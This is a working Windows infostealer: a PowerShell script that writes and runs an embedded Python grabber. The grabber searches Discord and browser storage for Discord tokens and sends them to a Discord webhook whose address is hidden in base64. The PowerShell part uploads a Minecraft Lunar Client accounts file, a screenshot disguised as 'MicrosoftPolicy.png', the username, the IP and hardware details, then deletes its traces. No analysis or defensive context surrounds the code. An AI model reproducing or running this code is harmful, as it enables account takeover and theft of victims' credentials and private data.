cd C:\temp
Set-Content UUID.py "

import os
import re
import json
import base64

from urllib.request import Request, urlopen

# your webhook URL
WEBHOOK_URL = base64.b64decode(b'aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTA2MzU5MDk4MzY0MTYxNjQ1Ni9tWk1GZE9EbUlvb3FyeEx6LVJUalVtSjNTb29jb3N0WjVxWUNfSUxYMU9JN05qRUpFU2Y0U21zWXRVTmNiSloyYU9NTA==').decode()

# mentions you when you get a hit
PING_ME = False

def find_tokens(path):
    path += '\\Local Storage\\leveldb'

    tokens = []

    for file_name in os.listdir(path):
        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
            continue

        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                for token in re.findall(regex, line):
                    tokens.append(token)
    return tokens

def main():
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')

    paths = {
        'Discord': roaming + '\\Discord',
        'Discord Canary': roaming + '\\discordcanary',
        'Discord PTB': roaming + '\\discordptb',
        'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
        'Opera': roaming + '\\Opera Software\\Opera Stable',
        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
    }

    message = '@everyone' if PING_ME else ''

    for platform, path in paths.items():
        if not os.path.exists(path):
            continue

        message += f'\n**{platform}**\n\n'

        tokens = find_tokens(path)

        if len(tokens) > 0:
            for token in tokens:
                message += f'||{token}||\n'
        else:
            message += '\n'

        message += ''

    headers = {
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
    }

    payload = json.dumps({'content': message})

    try:
        req = Request(WEBHOOK_URL, data=payload.encode(), headers=headers)
        urlopen(req)
    except:
        pass

if __name__ == '__main__':
    main()
    
"
cls

function Upload-Discord {

[CmdletBinding()]
param (
    [parameter(Position=0,Mandatory=$False)]
    [string]$file,

    [parameter(Position=1,Mandatory=$False)]
    [string]$text 
)

$Body = @{
  'content' = $text
}


if (-not ([string]::IsNullOrEmpty($text))){
Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)};

if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
}
cls

$Path = "C:\temp\"
# Make sure that the directory to keep screenshots has been created, otherwise create it
If (!(test-path $path)) {
New-Item -ItemType Directory -Force -Path $path
}
Add-Type -AssemblyName System.Windows.Forms
$screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
# Get the current screen resolution
$image = New-Object System.Drawing.Bitmap($screen.Width, $screen.Height)
# Create a graphic object
$graphic = [System.Drawing.Graphics]::FromImage($image)
$point = New-Object System.Drawing.Point(0, 0)
$graphic.CopyFromScreen($point, $point, $image.Size);
$cursorBounds = New-Object System.Drawing.Rectangle([System.Windows.Forms.Cursor]::Position, [System.Windows.Forms.Cursor]::Current.Size)
# Get a screenshot
[System.Windows.Forms.Cursors]::Default.Draw($graphic, $cursorBounds)
$screen_file = "$Path\" + "MicrosoftPolicy.png"
# Save the screenshot as a PNG file
$image.Save($screen_file, [System.Drawing.Imaging.ImageFormat]::Png)


$gpu = (Get-WmiObject win32_VideoController).Name
$cpu = (Get-WmiObject Win32_Processor).Name
$ip = (Invoke-WebRequest -uri "https://api.ipify.org/").Content
cls

Upload-Discord -text "------------------------------------------------@everyone--------------------------------------------------------------------------------------------------------------"
Upload-Discord -text "-----------------------------**INFO-MC**'---------------------------------------------"
Upload-Discord -file "C:\Users\$env:UserName\.lunarclient\settings\game\accounts.json"
Upload-Discord -text "**Token MC**: DEV..."
Upload-Discord -text "-----------------------------**INFO-PC**---------------------------------------------"
Upload-Discord -text "**Name**: $env:UserName"
Upload-Discord -text "--------------"
Upload-Discord -text "**IP**: $ip"
Upload-Discord -text "---"
Upload-Discord -text "**CPU**: $cpu"
Upload-Discord -text "---"
Upload-Discord -text "**GPU**: $gpu"
Upload-Discord -text "--------------------------------------------------------------------------------------"
Upload-Discord -file "C:\temp\MicrosoftPolicy.png"
Upload-Discord -text "-----------------------------**INFO-Discord**----------------------------------------"
Upload-Discord -text "HERE :"
cls
python C:\temp\UUID.py
cls
Remove-Item C:\temp\MicrosoftPolicy.png
cls
Remove-Item C:\temp\UUID.py
Upload-Discord -text "----------------------------------------------------------------------------------------------------------------------------------------------------------------------"
cls
exit




